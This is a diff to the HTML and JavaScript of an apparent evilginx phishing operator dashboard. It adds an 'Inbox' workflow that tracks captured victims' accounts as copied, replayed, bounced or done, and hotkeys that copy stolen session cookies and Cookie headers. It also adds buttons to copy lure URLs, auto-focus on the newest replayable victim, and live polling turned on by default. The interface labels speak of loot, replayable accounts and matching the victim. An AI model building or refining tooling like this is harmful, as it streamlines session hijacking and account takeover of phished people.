@@ -132,6 +132,13 @@
   .kind.none { color: var(--faint); }
   .persist { color: var(--mute); font-size: 12px; margin-left: 6px; }
   .mark { font-size: 11px; color: var(--mute); margin-left: 8px; }
+  .st { font-size: 12px; }
+  .st.inbox { color: var(--copper); }
+  .st.copied { color: var(--mute); }
+  .st.replayed { color: var(--olive); }
+  .st.bounced { color: var(--bad); }
+  .st.done { color: var(--faint); }
+  .wf { display: flex; gap: 4px; flex-wrap: wrap; margin: 0 0 12px; }
 
   .inspector {
     border-top: 1px solid var(--line);
@@ -280,7 +287,8 @@
   <div class="dombar" id="domains"></div>
   <div class="toolbar" id="toolbar">
     <select id="fphishlet"></select>
-    <label class="chk"><input type="checkbox" id="fvalid"> <span id="fvalid_l"></span></label>
+    <label class="chk" id="finboxwrap"><input type="checkbox" id="finbox" checked> <span id="finbox_l"></span></label>
+    <label class="chk"><input type="checkbox" id="fvalid" checked> <span id="fvalid_l"></span></label>
     <label class="chk" id="fnoisewrap"><input type="checkbox" id="fnoise"> <span id="fnoise_l"></span></label>
     <span class="count" id="count"></span>
   </div>
@@ -317,8 +325,11 @@ const I18N = {
   en: {
     search_ph:"user, IP, token…", refresh:"Refresh", auto:"Live", loot:"Loot zip", csv:"CSV",
     loot_t:"Cookies of every replayable account", csv_t:"Masked session CSV for the report",
-    tab_dash:"Dashboard", tab_victims:"Accounts", tab_sessions:"Captures", tab_lures:"Lures", tab_urls:"URLs", tab_settings:"Settings",
+    tab_dash:"Dashboard", tab_victims:"Inbox", tab_sessions:"Captures", tab_lures:"Lures", tab_urls:"URLs", tab_settings:"Settings",
     domains:"Hosts", all_phishlets:"All phishlets", only_valid:"Replayable only", show_noise:"Include visits with no login",
+    inbox_only:"Inbox", th_status:"Status",
+    st_inbox:"inbox", st_copied:"copied", st_replayed:"replayed", st_bounced:"bounced", st_done:"done",
+    empty_inbox:"Inbox is clear. Uncheck Inbox to see closed accounts.",
     th_user:"Account", th_phishlet:"Phishlet", th_loot:"Loot", th_cookies:"Cookies", th_attempts:"Hits",
     th_lastip:"IP", th_seen:"Seen", th_pass:"Password", th_captured:"Captured", th_expires:"Expires",
     th_target:"Target", th_lure_id:"Lure",
@@ -359,9 +370,9 @@ const I18N = {
     sb_off:'Safe Browsing off',
     flagged:"flagged", mip_title:n=>`same account from ${n} IPs — cookie may bounce on conditional access`,
     ago:(n,u)=>`${n}${u} ago`,
-    facts:(p,r,h,st,last)=>`${p} accounts · <b>${r} replayable</b> · ${h} captures · ${st} · ${last}`,
+    facts:(p,r,ib,h,st,last)=>`<b style="color:var(--copper)">${ib} inbox</b> · ${r} replayable · ${p} accounts · ${h} captures · ${st} · ${last}`,
     help_title:"Keys",
-    help_items:[["/","search"],["1–6","switch view"],["j k","move"],["c","copy cookies"],["r","refresh"],["?","this list"],["esc","close"]],
+    help_items:[["/","search"],["1–6","switch view"],["j k","move"],["c","copy cookies"],["b","copy replay brief"],["h","copy Cookie header"],["u","mark done"],["e","mark bounced"],["r","refresh"],["?","this list"],["esc","close"]],
     tokens:"Tokens", password:"Password", copy_user:"Copy account",
     replay_title:"Replay (manual)", replay_match:"Match the victim",
     replay_import:"Import cookies on", replay_then:"Then open", replay_avoid:"Do not use",
@@ -385,8 +396,11 @@ const I18N = {
   es: {
     search_ph:"cuenta, IP, token…", refresh:"Actualizar", auto:"En vivo", loot:"Loot zip", csv:"CSV",
     loot_t:"Cookies de cada cuenta rejugable", csv_t:"CSV enmascarado para el informe",
-    tab_dash:"Dashboard", tab_victims:"Cuentas", tab_sessions:"Capturas", tab_lures:"Lures", tab_urls:"URLs", tab_settings:"Ajustes",
+    tab_dash:"Dashboard", tab_victims:"Bandeja", tab_sessions:"Capturas", tab_lures:"Lures", tab_urls:"URLs", tab_settings:"Ajustes",
     domains:"Hosts", all_phishlets:"Todos los phishlets", only_valid:"Solo rejugables", show_noise:"Incluir visitas sin login",
+    inbox_only:"Bandeja", th_status:"Estado",
+    st_inbox:"bandeja", st_copied:"copiada", st_replayed:"rejugada", st_bounced:"rebotó", st_done:"hecha",
+    empty_inbox:"Bandeja vacía. Quita Bandeja para ver las cuentas cerradas.",
     th_user:"Cuenta", th_phishlet:"Phishlet", th_loot:"Loot", th_cookies:"Cookies", th_attempts:"Hits",
     th_lastip:"IP", th_seen:"Visto", th_pass:"Password", th_captured:"Capturado", th_expires:"Caduca",
     th_target:"Servicio", th_lure_id:"Lure",
@@ -427,9 +441,9 @@ const I18N = {
     sb_off:'Safe Browsing off',
     flagged:"flaggeado", mip_title:n=>`misma cuenta desde ${n} IPs — la cookie puede rebotar por conditional access`,
     ago:(n,u)=>`hace ${n}${u}`,
-    facts:(p,r,h,st,last)=>`${p} cuentas · <b>${r} rejugables</b> · ${h} capturas · ${st} · ${last}`,
+    facts:(p,r,ib,h,st,last)=>`<b style="color:var(--copper)">${ib} bandeja</b> · ${r} rejugables · ${p} cuentas · ${h} capturas · ${st} · ${last}`,
     help_title:"Teclas",
-    help_items:[["/","buscar"],["1–6","cambiar vista"],["j k","mover"],["c","copiar cookies"],["r","actualizar"],["?","esta lista"],["esc","cerrar"]],
+    help_items:[["/","buscar"],["1–6","cambiar vista"],["j k","mover"],["c","copiar cookies"],["b","copiar briefing"],["h","copiar cabecera Cookie"],["u","marcar hecha"],["e","marcar rebotó"],["r","actualizar"],["?","esta lista"],["esc","cerrar"]],
     tokens:"Tokens", password:"Password", copy_user:"Copiar cuenta",
     replay_title:"Replay (manual)", replay_match:"Igualar a la víctima",
     replay_import:"Importar cookies en", replay_then:"Luego abrir", replay_avoid:"No uses",
@@ -461,10 +475,21 @@ try {
 function t(k) { const v = (I18N[LANG] && I18N[LANG][k]) ?? I18N.en[k]; return v === undefined ? k : v; }
 
 const state = {
-  raw: [], tab: 'victims', q: '', phishlet: '', onlyValid: false, showNoise: false,
+  raw: [], tab: 'victims', q: '', phishlet: '', onlyValid: true, inbox: true, showNoise: false,
   sort: { key: 'update', dir: -1 }, auto: false, timer: null, knownIds: new Set(), firstLoad: true, sig: '',
   sel: null, rows: [], revealed: new Set(), period: 'week',
 };
+const STATUSES = ['inbox', 'copied', 'replayed', 'bounced', 'done'];
+function victimStatus(user) {
+  const st = (window._vstate || {})[String(user || '').toLowerCase()] || {};
+  if (st.status) return st.status;
+  return st.used ? 'done' : 'inbox';
+}
+function inInbox(v) {
+  if (!v || !v.valid) return false;
+  const s = victimStatus(v.username);
+  return s !== 'done' && s !== 'bounced';
+}
 const $ = s => document.querySelector(s);
 const esc = s => (s == null ? '' : String(s)).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
 
@@ -629,6 +654,9 @@ function applyStatic() {
   document.querySelector('[data-tab="settings"]').textContent = t('tab_settings');
   $('#fvalid_l').textContent = t('only_valid');
   $('#fnoise_l').textContent = t('show_noise');
+  $('#finbox_l').textContent = t('inbox_only');
+  $('#finbox').checked = state.inbox;
+  $('#fvalid').checked = state.onlyValid;
   $('#help_title').textContent = t('help_title');
   $('#help_dl').innerHTML = t('help_items').map(([k, v]) => `<dt>${esc(k)}</dt><dd>${esc(v)}</dd>`).join('');
 }
@@ -670,6 +698,7 @@ function applyFilter(list, keyUser, keyPhl) {
   return list.filter(x => {
     if (state.phishlet) { const p = keyPhl(x); const ok = Array.isArray(p) ? p.includes(state.phishlet) : p === state.phishlet; if (!ok) return false; }
     if (state.onlyValid && !x.valid) return false;
+    if (state.inbox && state.tab === 'victims' && x.username && !inInbox(x)) return false;
     if (q) {
       const extra = [x.lastIP, x.remote_addr, x.token, x.kind, ...(x.tokens || []), ...(x.best && x.best.tokens || [])].filter(Boolean).join(' ');
       const hay = (keyUser(x) + ' ' + extra).toLowerCase();
@@ -686,11 +715,12 @@ function sortList(list, getters) {
 function renderFacts() {
   const all = victims();
   const replay = all.filter(v => v.valid).length;
+  const inbox = all.filter(inInbox).length;
   const st = window._health && window._health.evilginx_up
     ? `<span class="ok">${t('health_up')}</span>`
     : `<span class="bad">${t('health_down')}</span>`;
   const last = window._health && window._health.last_capture ? t('last_capture') + ' ' + relTime(window._health.last_capture) : t('no_captures');
-  $('#facts').innerHTML = t('facts')(all.length, replay, state.raw.length, st, last);
+  $('#facts').innerHTML = t('facts')(all.length, replay, inbox, state.raw.length, st, last);
 }
 
 function render() {
@@ -709,6 +739,7 @@ function render() {
   if (tab === 'settings') { renderSettings(); return; }
   if (tab === 'lures') { renderLures(); return; }
   $('#fnoisewrap').style.display = tab === 'sessions' ? '' : 'none';
+  $('#finboxwrap').style.display = tab === 'victims' ? '' : 'none';
   if (tab === 'victims') renderVictims(); else renderSessions();
   renderInspector();
 }
@@ -869,7 +900,7 @@ function renderLures() {
   const rows = [...m.values()].sort((a, b) => b.valid - a.valid || b.visits - a.visits);
   $('#luresview').innerHTML =
     `<table><thead><tr>
-       <th>${t('th_target')}</th><th>${t('th_lure_id')}</th><th>${t('lure_col')}</th><th>${t('visits_col')}</th><th>${t('valid_col')}</th><th>${t('victims_col')}</th><th>${t('conv_col')}</th>
+       <th>${t('th_target')}</th><th>${t('th_lure_id')}</th><th>${t('lure_col')}</th><th>${t('visits_col')}</th><th>${t('valid_col')}</th><th>${t('victims_col')}</th><th>${t('conv_col')}</th><th></th>
      </tr></thead><tbody>` +
     (rows.length ? rows.map(e => {
       const conv = e.visits ? Math.round(e.valid / e.visits * 100) : 0;
@@ -878,8 +909,9 @@ function renderLures() {
         <td><div class="u">${esc(tgt.name)}</div>${tgt.detail ? `<div class="mut">${esc(tgt.detail)}</div>` : ''}</td>
         <td class="num" style="color:var(--copper)">${esc(lureId(e.url))}</td>
         <td class="mut" style="font-family:var(--mono);font-size:12px;word-break:break-all">${esc(e.url)}</td>
-        <td class="num">${e.visits}</td><td class="num">${e.valid}</td><td class="num">${e.users.size}</td><td class="num">${conv}%</td></tr>`;
-    }).join('') : `<tr><td colspan="7" class="empty">${t('no_lures')}</td></tr>`) + `</tbody></table>`;
+        <td class="num">${e.visits}</td><td class="num">${e.valid}</td><td class="num">${e.users.size}</td><td class="num">${conv}%</td>
+        <td><button class="btn" data-copyurl="${esc(e.url)}">${t('copy')}</button></td></tr>`;
+    }).join('') : `<tr><td colspan="8" class="empty">${t('no_lures')}</td></tr>`) + `</tbody></table>`;
 }
 
 async function loadVState() { try { window._vstate = await (await fetch('/api/vstate')).json() || {}; } catch (e) { window._vstate = {}; } }
@@ -904,31 +936,32 @@ function th(cols) {
 function renderVictims() {
   const all = victims();
   const filtered = applyFilter(all, v => v.username, v => v.phishlets);
-  const getters = { user: v => v.username, pass: v => v.password || '', phishlet: v => v.phishlets.join(','), valid: v => v.valid ? 1 : 0, expires: v => v.best && v.best.expires || 0, cookies: v => v.cookies, attempts: v => v.sessions.length, update: v => v.lastUpdate };
+  const getters = { user: v => v.username, pass: v => v.password || '', phishlet: v => v.phishlets.join(','), valid: v => v.valid ? 1 : 0, status: v => victimStatus(v.username), expires: v => v.best && v.best.expires || 0, cookies: v => v.cookies, attempts: v => v.sessions.length, update: v => v.lastUpdate };
   const rows = sortList(filtered, getters);
   state.rows = rows.map(v => ({ type: 'victim', key: v.username.toLowerCase(), data: v }));
   $('#thead').innerHTML = th([
-    ['user', t('th_user'), true], ['pass', t('th_pass'), true], ['phishlet', t('th_phishlet'), true], ['valid', t('th_loot'), true],
-    ['expires', t('th_expires'), true], ['cookies', t('th_cookies'), true], ['attempts', t('th_attempts'), true], ['', t('th_lastip'), false], ['update', t('th_seen'), true]
+    ['user', t('th_user'), true], ['status', t('th_status'), true], ['pass', t('th_pass'), true], ['phishlet', t('th_phishlet'), true], ['valid', t('th_loot'), true],
+    ['expires', t('th_expires'), true], ['', t('th_lastip'), false], ['update', t('th_seen'), true]
   ]);
   $('#tbody').innerHTML = rows.length ? rows.map(v => {
-    const vst = (window._vstate || {})[v.username.toLowerCase()] || {};
+    const st = victimStatus(v.username);
     const ips = new Set(v.sessions.map(s => s.remote_addr).filter(Boolean));
     const sel = state.sel && state.sel.type === 'victim' && state.sel.key === v.username.toLowerCase();
     return `<tr data-sel="victim:${esc(v.username.toLowerCase())}" class="${sel ? 'sel' : ''}">
       <td class="u">${esc(v.username)}</td>
+      <td><span class="st ${st}">${t('st_' + st)}</span></td>
       <td>${passCell(v.password, 'v:' + v.username.toLowerCase())}</td>
       <td class="phl">${v.phishlets.map(esc).join(', ')}</td>
-      <td>${kindCell(v.best)}${vst.used ? `<span class="mark">${t('used')}</span>` : ''}${ips.size > 1 ? `<span class="mark" title="${t('mip_title')(ips.size)}">${ips.size} IPs</span>` : ''}</td>
+      <td>${kindCell(v.best)}${ips.size > 1 ? `<span class="mark" title="${t('mip_title')(ips.size)}">${ips.size} IPs</span>` : ''}</td>
       <td>${ttlCell(v.best)}</td>
-      <td class="num">${v.cookies}</td>
-      <td class="num">${v.sessions.length}</td>
       <td class="mut">${v.best && v.best.geo && v.best.geo.country_code ? esc(v.best.geo.country_code) + ' · ' : ''}${esc(v.lastIP)}</td>
       <td class="mut" title="${absTime(v.lastUpdate)}">${relTime(v.lastUpdate)}</td>
     </tr>`;
-  }).join('') : `<tr><td colspan="9" class="empty">${t('empty_victims')}</td></tr>`;
+  }).join('') : `<tr><td colspan="8" class="empty">${state.inbox ? t('empty_inbox') : t('empty_victims')}</td></tr>`;
   $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('victims_l')}`;
-  if (!state.sel && rows[0]) state.sel = { type: 'victim', key: rows[0].username.toLowerCase() };
+  if (!state.sel || !state.rows.some(r => r.type === state.sel.type && r.key === state.sel.key)) {
+    state.sel = rows[0] ? { type: 'victim', key: rows[0].username.toLowerCase() } : null;
+  }
 }
 
 function renderSessions() {
@@ -957,7 +990,9 @@ function renderSessions() {
     </tr>`;
   }).join('') : `<tr><td colspan="9" class="empty">${t('empty_sessions')}</td></tr>`;
   $('#count').textContent = `${rows.length} ${t('of')} ${all.length} ${t('sessions_l')}`;
-  if (!state.sel && rows[0]) state.sel = { type: 'session', key: String(rows[0].id) };
+  if (!state.sel || !state.rows.some(r => r.type === state.sel.type && r.key === state.sel.key)) {
+    state.sel = rows[0] ? { type: 'session', key: String(rows[0].id) } : null;
+  }
 }
 
 function currentSel() {
@@ -976,6 +1011,7 @@ function renderInspector() {
     box.innerHTML = `
       <h2>${esc(v.username)}</h2>
       <p class="sub">${kindCell(b)} · ${ttlCell(b)} · ${b ? b.cookies : 0} ${t('cookies_w')} · ${v.phishlets.map(esc).join(', ')}</p>
+      <div class="wf">${STATUSES.map(s => `<button type="button" class="btn${victimStatus(v.username)===s?' on':''}" data-status="${s}" data-user="${esc(v.username)}">${t('st_'+s)}</button>`).join('')}</div>
       ${b ? replayBox(b) : ''}
       <div class="insp-actions">
         ${b && b.cookies ? `<button class="btn primary" data-copy="${b.id}">${t('copy_cookies')}</button>
@@ -1005,18 +1041,14 @@ function renderInspector() {
         </div>`).join('')}</div>
       <div class="cookies-list" id="ckbox" hidden></div>
       <div class="vstate">
-        <label class="setchk"><input type="checkbox" id="vs_used" ${vst.used ? 'checked' : ''}> ${t('mark_used')}</label>
         <input class="notes" id="vs_notes" placeholder="${t('notes_ph')}" value="${esc(vst.notes || '')}">
         <button class="btn" id="vs_save">${t('save')}</button>
         ${ips.length > 1 ? `<span class="mut">IPs: ${ips.map(esc).join(', ')}</span>` : ''}
       </div>`;
     const save = $('#vs_save');
-    if (save) save.onclick = async () => {
-      const used = $('#vs_used').checked;
-      const notes = $('#vs_notes').value;
-      await fetch('/api/vstate', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ user: v.username, used: used ? 'true' : 'false', notes }) });
-      await loadVState(); toast(t('vstate_saved')); render();
-    };
+    if (save) save.onclick = () => setVictimStatus(v.username, victimStatus(v.username), $('#vs_notes').value);
+    const notes = $('#vs_notes');
+    if (notes) notes.addEventListener('keydown', e => { if (e.key === 'Enter') { e.preventDefault(); setVictimStatus(v.username, victimStatus(v.username), notes.value); } });
     return;
   }
   const s = row.data;
@@ -1047,12 +1079,25 @@ async function copyCookieHeader(id) {
     toast(t('replay_hdr_copied'));
   } catch (e) { toast(t('error') + ': ' + e); }
 }
+async function setVictimStatus(user, status, notes, quiet) {
+  const cur = (window._vstate || {})[user.toLowerCase()] || {};
+  const body = new URLSearchParams({ user, status, notes: notes !== undefined ? notes : (cur.notes || '') });
+  await fetch('/api/vstate', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body });
+  await loadVState();
+  if (!quiet) toast(t('vstate_saved'));
+  render();
+}
 async function copyCookies(id) {
   try {
     const r = await fetch('/cookies?id=' + id);
     const arr = await r.json();
     await navigator.clipboard.writeText(JSON.stringify(arr, null, 2));
     toast(t('copied_paste')(id));
+    const row = currentSel();
+    if (row && row.type === 'victim') {
+      const st = victimStatus(row.data.username);
+      if (st === 'inbox') await setVictimStatus(row.data.username, 'copied', undefined, true);
+    }
   } catch (e) { toast(t('error') + ': ' + e); }
 }
 async function showCookies(id) {
@@ -1169,7 +1214,14 @@ async function fetchData(force) {
     const sig = d.sessions.length + ':' + d.sessions.reduce((m, s) => Math.max(m, s.update || 0), 0) + ':' + d.sessions.reduce((a, s) => a + s.cookies, 0);
     if (!force && sig === state.sig) { renderFacts(); return; }
     const ids = new Set(d.sessions.map(s => s.id));
-    if (!state.firstLoad && sig !== state.sig) { const fresh = [...ids].filter(i => !state.knownIds.has(i)); if (fresh.length) toast(t('new_sessions')(fresh.length)); }
+    if (!state.firstLoad && sig !== state.sig) {
+      const fresh = [...ids].filter(i => !state.knownIds.has(i));
+      if (fresh.length) {
+        toast(t('new_sessions')(fresh.length));
+        const newest = d.sessions.filter(s => fresh.includes(s.id) && s.valid && s.username).sort((a, b) => (b.update || 0) - (a.update || 0))[0];
+        if (newest) { state.tab = 'victims'; state.sel = { type: 'victim', key: newest.username.toLowerCase() }; }
+      }
+    }
     state.sig = sig; state.raw = d.sessions;
     const sel = $('#fphishlet'); const cur = sel.value;
     const phls = [...new Set(d.sessions.map(s => s.phishlet))].sort();
@@ -1205,6 +1257,8 @@ function selectedCopyId() {
 document.addEventListener('click', e => {
   const sort = e.target.closest('[data-sort]');
   if (sort) { const k = sort.dataset.sort; if (state.sort.key === k) state.sort.dir *= -1; else state.sort = { key: k, dir: -1 }; render(); return; }
+  const stbtn = e.target.closest('[data-status]');
+  if (stbtn) { setVictimStatus(stbtn.dataset.user, stbtn.dataset.status); return; }
   const copy = e.target.closest('[data-copy]');
   if (copy) { copyCookies(copy.dataset.copy); return; }
   const ctxt = e.target.closest('[data-copytext]');
@@ -1250,6 +1304,7 @@ let qTimer;
 $('#q').addEventListener('input', e => { clearTimeout(qTimer); qTimer = setTimeout(() => { state.q = e.target.value.trim(); render(); }, 160); });
 $('#fphishlet').onchange = e => { state.phishlet = e.target.value; render(); };
 $('#fvalid').onchange = e => { state.onlyValid = e.target.checked; render(); };
+$('#finbox').onchange = e => { state.inbox = e.target.checked; state.sel = null; render(); };
 $('#fnoise').onchange = e => { state.showNoise = e.target.checked; render(); };
 $('#refresh').onclick = () => fetchData(true);
 $('#auto').onclick = () => {
@@ -1271,6 +1326,17 @@ document.addEventListener('keydown', e => {
   if (typing) return;
   if (e.key === 'r') { fetchData(true); return; }
   if (e.key === 'c') { const id = selectedCopyId(); if (id) copyCookies(id); return; }
+  if (e.key === 'b') {
+    const row = currentSel(); const sess = row && (row.type === 'victim' ? row.data.best : row.data);
+    if (sess) navigator.clipboard.writeText(replayBrief(sess)).then(() => toast(t('replay_brief_copied')));
+    return;
+  }
+  if (e.key === 'h') { const id = selectedCopyId(); if (id) copyCookieHeader(id); return; }
+  if (e.key === 'u' || e.key === 'e') {
+    const row = currentSel();
+    if (row && row.type === 'victim') setVictimStatus(row.data.username, e.key === 'u' ? 'done' : 'bounced');
+    return;
+  }
   if (e.key === 'j' || e.key === 'ArrowDown') { e.preventDefault(); moveSel(1); return; }
   if (e.key === 'k' || e.key === 'ArrowUp') { e.preventDefault(); moveSel(-1); return; }
   if (e.key >= '1' && e.key <= '6') {
@@ -1280,7 +1346,13 @@ document.addEventListener('keydown', e => {
 });
 
 applyStatic();
-fetchData(true);
+fetchData(true).then(() => {
+  if (!state.auto) {
+    state.auto = true;
+    $('#auto').classList.add('on');
+    state.timer = setInterval(() => fetchData(false), 10000);
+  }
+});
 </script>
 </body>
 </html>
